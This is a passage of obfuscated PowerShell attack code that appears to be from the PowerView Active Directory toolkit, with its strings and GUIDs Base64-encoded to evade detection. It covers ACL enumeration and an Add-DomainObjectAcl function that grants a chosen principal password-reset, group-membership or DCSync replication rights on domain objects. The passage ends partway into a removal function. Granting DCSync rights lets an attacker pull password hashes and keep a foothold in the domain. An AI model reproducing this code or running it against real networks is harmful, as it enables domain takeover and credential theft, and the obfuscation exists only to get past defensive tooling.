        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $Searcher = Get-DomainSearcher @SearcherArguments
        $DomainGUIDMapArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $DomainGUIDMapArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $DomainGUIDMapArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $DomainGUIDMapArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $DomainGUIDMapArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $DomainGUIDMapArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAbwBsAHYAZQBHAFUASQBEAHMA')))]) {
            $GUIDs = Get-DomainGUIDMap @DomainGUIDMapArguments
        }
    }
    PROCESS {
        if ($Searcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAC4AKgA=')))) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgAoAEMATgB8AE8AVQB8AEQAQwApAD0ALgAqAA==')))) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose "[Get-DomainObjectAcl] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityDomain
                        $Searcher = Get-DomainSearcher @SearcherArguments
                        if (-not $Searcher) {
                            Write-Warning "[Get-DomainObjectAcl] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose "[Get-DomainObjectAcl] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            if ($Filter) {
                $Searcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObjectAcl] Get-DomainObjectAcl filter string: $($Searcher.filter)"
            $Results = $Searcher.FindAll()
            $Results | Where-Object {$_} | ForEach-Object {
                $Object = $_.Properties
                if ($Object.objectsid -and $Object.objectsid[0]) {
                    $ObjectSid = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                }
                else {
                    $ObjectSid = $Null
                }
                try {
                    New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Object[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgB0AHMAZQBjAHUAcgBpAHQAeQBkAGUAcwBjAHIAaQBwAHQAbwByAA==')))][0], 0 | ForEach-Object { if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAGMAbAA=')))]) {$_.SystemAcl} else {$_.DiscretionaryAcl} } | ForEach-Object {
                        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBpAGcAaAB0AHMARgBpAGwAdABlAHIA')))]) {
                            $GuidFilter = Switch ($RightsFilter) {
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                                Default { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADAAMAAwADAAMAAwAC0AMAAwADAAMAAtADAAMAAwADAALQAwADAAMAAwAC0AMAAwADAAMAAwADAAMAAwADAAMAAwADAA'))) }
                            }
                            if ($_.ObjectType -eq $GuidFilter) {
                                $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
                                $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $ObjectSid
                                $Continue = $True
                            }
                        }
                        else {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQARABOAA=='))) $Object.distinguishedname[0]
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAUwBJAEQA'))) $ObjectSid
                            $Continue = $True
                        }
                        if ($Continue) {
                            $_ | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBjAHQAaQB2AGUARABpAHIAZQBjAHQAbwByAHkAUgBpAGcAaAB0AHMA'))) ([Enum]::ToObject([System.DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                            if ($GUIDs) {
                                $AclProperties = @{}
                                $_.psobject.properties | ForEach-Object {
                                    if ($_.Name -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBiAGoAZQBjAHQAVAB5AHAAZQB8AEkAbgBoAGUAcgBpAHQAZQBkAE8AYgBqAGUAYwB0AFQAeQBwAGUAfABPAGIAagBlAGMAdABBAGMAZQBUAHkAcABlAHwASQBuAGgAZQByAGkAdABlAGQATwBiAGoAZQBjAHQAQQBjAGUAVAB5AHAAZQA=')))) {
                                        try {
                                            $AclProperties[$_.Name] = $GUIDs[$_.Value.toString()]
                                        }
                                        catch {
                                            $AclProperties[$_.Name] = $_.Value
                                        }
                                    }
                                    else {
                                        $AclProperties[$_.Name] = $_.Value
                                    }
                                }
                                $OutObject = New-Object -TypeName PSObject -Property $AclProperties
                                $OutObject.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                                $OutObject
                            }
                            else {
                                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBBAEMATAA='))))
                                $_
                            }
                        }
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainObjectAcl] Error: $_"
                }
            }
        }
    }
}
function Add-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }
    PROCESS {
        $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments
        ForEach ($TargetObject in $Targets) {
            $InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AZQA=')))
            $ControlType = [System.Security.AccessControl.AccessControlType] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AA==')))
            $ACEs = @()
            if ($RightsGUID) {
                $GUIDs = @($RightsGUID)
            }
            else {
                $GUIDs = Switch ($Rights) {
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQB0AFAAYQBzAHMAdwBvAHIAZAA='))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAwADIAOQA5ADUANwAwAC0AMgA0ADYAZAAtADEAMQBkADAALQBhADcANgA4AC0AMAAwAGEAYQAwADAANgBlADAANQAyADkA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBmADkANgA3ADkAYwAwAC0AMABkAGUANgAtADEAMQBkADAALQBhADIAOAA1AC0AMAAwAGEAYQAwADAAMwAwADQAOQBlADIA'))) }
                    $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAFMAeQBuAGMA'))) { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBhAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MQAxADMAMQBmADYAYQBkAC0AOQBjADAANwAtADEAMQBkADEALQBmADcAOQBmAC0AMAAwAGMAMAA0AGYAYwAyAGQAYwBkADIA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('OAA5AGUAOQA1AGIANwA2AC0ANAA0ADQAZAAtADQAYwA2ADIALQA5ADkAMQBhAC0AMABmAGEAYwBiAGUAZABhADYANAAwAGMA')))}
                }
            }
            ForEach ($PrincipalObject in $Principals) {
                Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname)"
                try {
                    $Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]$PrincipalObject.objectsid)
                    if ($GUIDs) {
                        ForEach ($GUID in $GUIDs) {
                            $NewGUID = New-Object Guid $GUID
                            $ADRights = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AHQAZQBuAGQAZQBkAFIAaQBnAGgAdAA=')))
                            $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $NewGUID, $InheritanceType
                        }
                    }
                    else {
                        $ADRights = [System.DirectoryServices.ActiveDirectoryRights] $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAG4AZQByAGkAYwBBAGwAbAA=')))
                        $ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule $Identity, $ADRights, $ControlType, $InheritanceType
                    }
                    ForEach ($ACE in $ACEs) {
                        Write-Verbose "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname)"
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAGMAbAA=')))
                        $TargetEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_"
                }
            }
        }
    }
}
function Remove-DomainObjectAcl {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $TargetIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $TargetLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $TargetSearchBase,
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PrincipalIdentity,
        [ValidateNotNullOrEmpty()]
        [String]
        $PrincipalDomain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [ValidateSet('All', 'ResetPassword', 'WriteMembers', 'DCSync')]
        [String]
        $Rights = 'All',
        [Guid]
        $RightsGUID
    )
    BEGIN {
        $TargetSearcherArguments = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA==')))
            'Raw' = $True
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARABvAG0AYQBpAG4A')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $TargetDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $TargetLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $TargetSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $PrincipalSearcherArguments = @{
            'Identity' = $PrincipalIdentity
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbwBiAGoAZQBjAHQAcwBpAGQA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGkAbgBjAGkAcABhAGwARABvAG0AYQBpAG4A')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $PrincipalDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $PrincipalSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not $Principals) {
            throw "Unable to resolve principal: $PrincipalIdentity"
        }
    }
    PROCESS {
        $TargetSearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $TargetIdentity
        $Targets = Get-DomainObject @TargetSearcherArguments
        ForEach ($TargetObject in $Targets) {
